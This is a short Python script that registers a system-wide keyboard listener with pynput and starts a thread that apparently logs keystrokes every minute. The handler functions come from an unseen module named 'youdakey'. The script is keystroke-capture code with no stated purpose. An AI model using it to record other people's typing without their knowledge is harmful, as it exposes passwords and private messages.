from pynput.keyboard import Listener
import threading

from youdakey import on_press,log_by_minute

log_thread = threading.Thread(target=log_by_minute)
log_thread.start()


with Listener(on_press=on_press) as listener:
    listener.join()
